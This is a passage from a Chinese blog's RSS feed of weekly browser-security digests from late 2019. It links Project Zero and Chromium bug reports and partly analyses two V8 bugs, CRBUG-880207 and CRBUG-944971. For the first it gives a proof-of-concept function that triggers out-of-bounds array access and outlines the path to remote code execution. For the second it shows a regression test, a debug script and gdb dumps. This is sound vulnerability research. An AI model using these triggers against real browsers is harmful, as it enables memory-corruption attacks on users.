&lt;p&gt;后来我想到了一种方法，可以构造一个数据库，反向搜索调用，比如我们想看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity()&lt;/code&gt;都有哪些路径可以调用到，那么我们从这个节点开始，往上找，比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt;函数调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startActivity()&lt;/code&gt;，那么我们看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt;函数都被哪些函数调用到了，然后搜索下去，就是个广搜嘛，最后我们搜到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onReceiver&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate&lt;/code&gt;等这些入口函数的时候，就可以判断当前组件是否导出，若是广播接收器，可以判断是静态注册的还是动态注册等，这就属于细节方面了，然后我们将所有路径使用某种方式表达出来，手动去确认调用路径是否可行即可&lt;/p&gt;

&lt;p&gt;我还思考了一种更加进阶的方式，自定义漏洞链，什么意思呢？&lt;/p&gt;

&lt;p&gt;我再举个例子，比如现在有一个App，通过HTTP（不一定是HTTP，HTTPS也可以）下载了一个压缩包，然后解压缩这个文件，那么在这个过程中，可能会出现使用HTTP导致被劫持的问题，如果使用HTTPS，会有压缩文件存储路径不安全导致文件被替换，路径穿越等，问题是各种各样的，我们可以通过钩子等方式记录下所有的功能点，触发了哪个功能点，就做标记，比如我现在有这么一条自定义的漏洞链，如果发现应用在使用HTTP下载压缩包，就可以给第一个节点做标记，每击中一个，就标记一个，当然，需要连贯性，不能中断，不能解压缩本地应用私有文件夹内的一个压缩包也给算到这条链上，那肯定是不行的&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP下载 -&amp;gt; 解压缩 -&amp;gt; getName()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其它的漏洞链可多了，大家可以自己思考&lt;/p&gt;

&lt;p&gt;可惜的是，以上我说的绝大部分工作，被MWR的大佬们做完了，大佬们早早地就想到了我说的这些东西，接下来我好好研究下这个工具，好东西啊这是！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/FSecureLABS/Jandroid&lt;/li&gt;
  &lt;li&gt;https://labs.f-secure.com/blog/automating-pwn2own-with-jandroid/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;泉哥写了篇文章简单介绍了下这个工具&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://riusksk.me/2019/11/02/Jandroid%EF%BC%9A%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96Android%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说真的，这种思路真的是逻辑洞大杀器，反正都已经聊到这里了，我再说一个我接下来要做的一个工具，不是什么牛逼的工具，就是一个辅助，讲讲思路，首先通过上述的方式获取一个利用链&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;A.onCreate() -&amp;gt; B.b(getIntent) -&amp;gt; C.c(intent.getXXX(&quot;xxx&quot;)) -&amp;gt; startActivity()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么我们去分析的时候还是需要使用反编译工具顺着这条路径去分析的，其中复杂程度其实也挺麻烦的，如果我们能够自动化的把所有需要的代码用图的形式打印出来，生成一张我们需要的流程图，辅助我们分析，就会好很多，也可以节省很多时间，不知道这个思路我描述清楚了没有&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7AA66D027BBBA664E24402DCD873FA93.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟搞内核，系统漏洞的大佬们比不了，这玩意还是比较简单，大佬们不要嘲笑&lt;/p&gt;

&lt;p&gt;最后是私藏的几个准备跟着学习的漏洞，玄武大法好，学学学！&lt;/p&gt;

&lt;p&gt;iOS iMessage NSSharedKeyDictionary 解码越界读漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1918&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Adobe Acrobat Reader DC JBIG2Globals stream 解析指针未初始化漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1926&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;微软研究员关于内存安全的一个演讲《Quest Memory Safety》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/microsoft/MSRC-Security-Research/tree/master/presentations/2019_09_Ekoparty&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Windows win32k xxxCreateWindowEx 内核信息泄露漏洞（CVE-2019-1071）的分析&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.ragestorm.net/blogs/?p=458&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;15年BlackHat关于华为海思TrustZone的攻击，不知道李神探知道后会不会害怕:))&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.blackhat.com/docs/us-15/materials/us-15-Shen-Attacking-Your-Trusted-Core-Exploiting-Trustzone-On-Android-wp.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;听说华为20亿重奖反制裁团队，我一瞬间酸成柠檬精了&lt;/p&gt;
</description>
                <pubDate>Fri, 15 Nov 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/11/15/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.11-2019.11.15.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/11/15/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.11-2019.11.15.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.11.04 - 2019.11.08</title>
                <description>&lt;p&gt;谷歌紧急修复了两个洞，说是已经被黑客组织利用了，大家及时更新&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://securelist.com/chrome-0-day-exploit-cve-2019-13720-used-in-operation-wizardopium/94866/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下是这两个漏洞的链接，目前都不可访问，Poc我没搜到，这段时间再跟进一下&lt;/p&gt;

&lt;p&gt;CVE-2019-13720: Use-after-free in audio&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=1019226&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;CVE-2019-13721: Use-after-free in PDFium&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=1013868&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这几周的UXSS有点多，然而我不懂&lt;/p&gt;

&lt;p&gt;WebKit：UXSS
Issue 1914: WebKit: Universal XSS in JSObject::putInlineSlow and JSValue::putToPrimitive&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1914&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;WebKit：整数溢出导致UXSS和类型混淆&lt;/p&gt;

&lt;p&gt;Issue 1919: WebKit: Integer overflow in NodeRareData::m_connectedFrameCount can lead to UXSS and type confusion&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1919&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;JSC：bailout过程中的一个类型混淆&lt;/p&gt;

&lt;p&gt;Issue 1924: JSC: Type confusion during bailout when reconstructing arguments objects&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1924&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Chrome：绕过Site Isolation以及本地文件泄露&lt;/p&gt;

&lt;p&gt;Issue 1928: Chrome: Site Isolation bypass and local file disclosure via Payment Handler API&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1928&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近把CRBUG-880207分析了一下，感谢JR师傅，宏阳师傅，p4nda师傅，ditto师傅，路遥师傅对我在这个漏洞分析过程遇到问题时的帮助&lt;/p&gt;

&lt;p&gt;这个漏洞是因为Turbofan对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;进行JIT优化的时候，未正确评估返回值的类型，漏了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;这个类型，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;的时候，传播了错误的类型信息，Turbofan根据错误的信息去掉了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CheckBound&lt;/code&gt;这个节点，最后获得越界读写，造成了RCE&lt;/p&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;阶段，会对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;返回如下几个类型，我们可以看到，这里没有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;这个类型&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
    ...
    switch (function.shared().builtin_function_id()) {
        ...
        case BuiltinFunctionId::kMathAbs:
        case BuiltinFunctionId::kMathExp:
        case BuiltinFunctionId::kMathExpm1:
            return Type::Union(Type::PlainNumber(), Type::NaN(), t-&amp;gt;zone());
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们来看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;的定义：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Refereance/Global_Objects/Math/expm1&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Math.expm1() 函数返回 E**x - 1, 其中 x 是该函数的参数, E 是自然对数的底数 2.718281828459045
Math.expm1(1)     // 1.7182818284590453
Math.expm1(-38)   // -1
Math.expm1(“-38”) // -1
Math.expm1(“foo”) // NaN&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;那我们传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;会发生什么呢？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d8&amp;gt; Math.expm1(-0)
0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到终端输出的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，如果我们用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.is&lt;/code&gt;来比较呢？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d8&amp;gt; Object.is(Math.expm1(-0), -0)
true
d8&amp;gt; Object.is(Math.expm1(-0), 0)
false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以我们可以得到一个结论：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1(-0)&lt;/code&gt;得到的结果是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;那么这个结论有什么用呢？&lt;/p&gt;

&lt;p&gt;我们结合一开始的优化代码来分析，在对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;的时候，Turbofan认为这个函数只能返回以下几个类型，这其中并不包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;在Turbofan里用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MinusZero&lt;/code&gt;来表示&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;return Type::Union(Type::PlainNumber(), Type::NaN(), t-&amp;gt;zone());
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说：在优化结束之后，会把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Object.is(Math.expm1(-0), -0)&lt;/code&gt;直接折叠为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;，也就是常量折叠&lt;/p&gt;

&lt;p&gt;我们接下来通过跟踪优化过程来分析&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  x64.debug git:(CRBUG-880207) ./d8 --allow-natives-syntax --trace-turbo Poc.js
......
false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Typer&lt;/code&gt;阶段，注意看红色框框里的内容，我们可以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Math.expm1&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PlainNumber | NaN&lt;/code&gt;，这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;不包含&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，右边的节点类型是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MinusZero&lt;/code&gt;也就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt;，这两个数据传入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SameValue&lt;/code&gt;节点进行比较，这明显是恒不相等的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/9A6301EE2040F342941B2B4D867CF083.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;typed lowering&lt;/code&gt;阶段，这三个节点会进行常量折叠为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A290C3C2969C67D85B631703F6F52FED.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我们可以看到打印出来的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;漏洞的成因大概就是这样，至于如何利用这里简单讲一下，详细的利用过程正在单独写文章&lt;/p&gt;

&lt;p&gt;首先我们利用这个错误的类型推断，去传播错误的类型信息，但是太早被分析出来跟-0比较会被常量折叠，所以我们可以利用逃逸分析这个阶段，代码如下，以下这种方式，就可以防止在逃逸分析前进行常量折叠，然后逃逸分析之后的Simplified Lowering阶段会进行最后一次typing，就会错误的判断这里是一个恒为false的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;，之后把这个错误的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Type&lt;/code&gt;传播下去，那么后面数组的存取前的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkbound&lt;/code&gt;节点就被会优化掉，不太好用的相对地址读写原语Get，然后我们写掉这个数组后面的一个数组长度，一个好用的相对地址读写原语Get！剩下的就是常规利用操作了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b * 1337];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;再次感谢各位师傅们的帮助！&lt;/p&gt;
</description>
                <pubDate>Fri, 08 Nov 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/11/08/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.04-2019.11.08.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/11/08/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.11.04-2019.11.08.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.10.27 - 2019.11.01</title>
                <description>&lt;p&gt;抢到了林俊杰演唱会的门票，去重庆浪了一波，拖到现在更新一波安全周报&lt;/p&gt;

&lt;p&gt;JSC: GetterSetter type confusion during DFG compilation&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1915&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;WebKit: Universal XSS in HTMLFrameElementBase::isURLAllowed&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1916&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以下这个漏洞可以学习下审计的思路，剩下我不多说了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blogs.projectmoon.pw/iOS/iOS_13_1_3_Full_Chain_Eop.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这篇文章里面提到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACF&lt;/code&gt;的全名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;强制访问控制框架&lt;/code&gt;，iOS/macOS中的MACF来源于TrustedBSD，像代码签名，沙盒，库验证都依赖于&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACF&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;有一篇相关的论文大家可以读一读《New approaches to operating system security extensibility》&lt;/p&gt;

&lt;p&gt;更多的细节大家可以学习360 Nirvan Team在2017 ISC上的分享《手把手教你突破 iOS 9.x 用户空间防护》，里面非常详细的讲解了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACF&lt;/code&gt;的设计原理和设计实现&lt;/p&gt;

&lt;p&gt;这几天有一个名单传的比较火&lt;/p&gt;

&lt;p&gt;2018-2020青年安全圈-活跃技术博主/博客&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/404notf0und/Security-Data-Analysis-and-Visualization&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;满怀期待想看看别人是怎么介绍我的&lt;/p&gt;

&lt;p&gt;emmmmmmmmmmm，翻了两遍&lt;/p&gt;

&lt;p&gt;我已经被排除在活跃技术博主的范围之外了&lt;/p&gt;

&lt;p&gt;肯定是我太懒了！&lt;/p&gt;
</description>
                <pubDate>Fri, 01 Nov 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/11/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.10.27-2019.11.01.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/11/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.10.27-2019.11.01.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.10.21 - 2019.10.25</title>
                <description>&lt;p&gt;有段时间没有更新浏览器了&lt;/p&gt;

&lt;p&gt;JS Fuzz，有点意思，我还没有看源码&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/fuzzitdev/jsfuzz&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最近分析了CRBUG-944971，对应的CVE编号是CVE-2019-13698，正则模块的漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=944971&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;触发漏洞的原理很简单，根据报告者的Exp去找漏洞的触发路径很有意思&lt;/p&gt;

&lt;p&gt;首先正则的Replace函数认为传入的是未经修改的对象，也就是说没有被重新定义过的正则对象，它会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ToString()&lt;/code&gt;，这是一个可以在上层进行定义的函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;V8_WARN_UNUSED_RESULT MaybeHandle&amp;lt;String&amp;gt; RegExpReplace(Isolate* isolate, Handle&amp;lt;JSRegExp&amp;gt; regexp, Handle&amp;lt;String&amp;gt; string, Handle&amp;lt;Object&amp;gt; replace_obj) {
    // Functional fast-paths are dispatched directly by replace builtin.
    DCHECK(RegExpUtils::IsUnmodifiedRegExp(isolate, regexp));
    DCHECK(!replace_obj-&amp;gt;IsCallable());

    Factory* factory = isolate-&amp;gt;factory();

    const int flags = regexp-&amp;gt;GetFlags();
    const bool global = (flags &amp;amp; JSRegExp::kGlobal) != 0;
    const bool sticky = (flags &amp;amp; JSRegExp::kSticky) != 0;

    Handle&amp;lt;String&amp;gt; replace;
    ASSIGN_RETURN_ON_EXCEPTION(isolate, replace, Object::ToString(isolate, replace_obj), String); &amp;lt;== 1
    replace = String::Flatten(isolate, replace);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;官方给的回归测试文件可以看到就是在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt;里进行操作&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let re = /x/y;
let cnt = 0;
let str = re[Symbol.replace](&quot;x&quot;, {
    toString: () =&amp;gt; {
        cnt++;
        if (cnt == 2) {
            re.lastIndex = {valueOf: () =&amp;gt; {
                re.x = 42;
                return 0;
            }};
        }
        return 'y$';
    }
});
assertEquals(&quot;y$&quot;, str);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;具体这个漏洞的利用细节我会单独写一篇文章分析，周报里简单讲讲，首先我们使用下面的代码测试一个特性&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var pattern = new RegExp(&quot;AA&quot;,&quot;g&quot;);
%DebugPrint(pattern);

pattern.__defineGetter__('x', ()=&amp;gt;2);
%DebugPrint(pattern);

pattern.__defineGetter__('x', ()=&amp;gt;2);
%DebugPrint(pattern);

while(true);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%DebugPrint&lt;/code&gt;是V8调试版本下一个用于打印对象的接口，输出的数据我简化一下，第二次&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__defineGetter__&lt;/code&gt;执行完后，可以看到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lastIndex&lt;/code&gt;被移动到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;properties&lt;/code&gt;存储，同时对象长度减少8字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DebugPrint: 0x1fb102d4dcc1: [JSRegExp]
 - map: 0x1d23bf341359 &amp;lt;Map(HOLEY_ELEMENTS)&amp;gt; [FastProperties]
 - properties: 0x1878b9400c71 &amp;lt;FixedArray[0]&amp;gt; {
    #lastIndex: 0 (data field 0)
 }
0x1d23bf341359: [Map]
 - type: JS_REGEXP_TYPE
 - instance size: 56

------------------------------------------------------------

DebugPrint: 0x1fb102d4dcc1: [JSRegExp]
 - map: 0x1d23bf34a9f9 &amp;lt;Map(HOLEY_ELEMENTS)&amp;gt; [FastProperties]
 - properties: 0x1878b9400c71 &amp;lt;FixedArray[0]&amp;gt; {
    #lastIndex: 0 (data field 0)
    #x: 0x2d807e95f4c1 &amp;lt;AccessorPair&amp;gt; (const accessor descriptor)
 }
0x1d23bf34a9f9: [Map]
 - type: JS_REGEXP_TYPE
 - instance size: 56

------------------------------------------------------------

DebugPrint: 0x1fb102d4dcc1: [JSRegExp]
 - map: 0x1d23bf34aa49 &amp;lt;Map(HOLEY_ELEMENTS)&amp;gt; [DictionaryProperties]
 - properties: 0x1fb102d4f631 &amp;lt;NameDictionary[29]&amp;gt; {
   #lastIndex: 0 (data, dict_index: 1, attrs: [W__])
   #x: 0x2d807e95f4d9 &amp;lt;AccessorPair&amp;gt; (accessor, dict_index: 2, attrs: [WEC])
 }
0x1d23bf34aa49: [Map]
 - type: JS_REGEXP_TYPE
 - instance size: 48
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;记住上面的这点，我们来看内存角度&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var pattern = new RegExp(&quot;AA&quot;,&quot;g&quot;);
gdb-peda$ x/20gx 0x99f7870dcd8
0x99f7870dcd8:	0x000030b004981359	0x00003df557b80c71
0x99f7870dce8:	0x00003df557b80c71	0x0000099f7870f561
0x99f7870dcf8:	0x000000a31509f099	0x0000000100000000
0x99f7870dd08:	0x0000000000000000	0x00003df557b808a1

以下因为重新运行导致内存地址变化，问题不大，两次执行过后可以看到核心的地方出现了，注意箭头指向的地方，原先是`0`，现在变成了一个地址
pattern.__defineGetter__('x', ()=&amp;gt;2);
pattern.__defineGetter__('x', ()=&amp;gt;2);
gdb-peda$ x/20gx 0x30e12f60dce0
0x30e12f60dce0:	0x0000365cc160aa49	0x000030e12f60f651
0x30e12f60dcf0:	0x00003cb956540c71	0x000030e12f60f569
0x30e12f60dd00:	0x00000d083935f099	0x0000000100000000
0x30e12f60dd10:	0x00003cb956540321 &amp;lt;==	0x00003cb9565408a1
0x30e12f60dd20:	0x0000018300000000	0x0000000100000000
0x30e12f60dd30:	0x0000000000000000	0x0000008000000000
0x30e12f60dd40:	0x00003cb9565404d1	0x00003cb9565404d1
0x30e12f60dd50:	0x00003cb9565404d1	0x00003cb9565404d1
0x30e12f60dd60:	0x00003cb9565404d1	0x00003cb9565404d1
0x30e12f60dd70:	0x00003cb9565404d1	0x00003cb9565404d1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;job&lt;/code&gt;命令查看，它是一个对象的Map，也就是说，这里是一个新的对象内存空间&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ job 0x00003cb956540321
0x3cb956540321: [Map]
 - type: FILLER_TYPE
 - instance size: 8
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x3cb9565404d1 &amp;lt;undefined&amp;gt;
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x3cb956540259 &amp;lt;DescriptorArray[0]&amp;gt;
 - layout descriptor: (nil)
 - prototype: 0x3cb9565401d9 &amp;lt;null&amp;gt;
 - constructor: 0x3cb9565401d9 &amp;lt;null&amp;gt;
 - dependent code: 0x3cb9565402c1 &amp;lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&amp;gt;
 - construction counter: 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个特性有什么用呢？&lt;/p&gt;

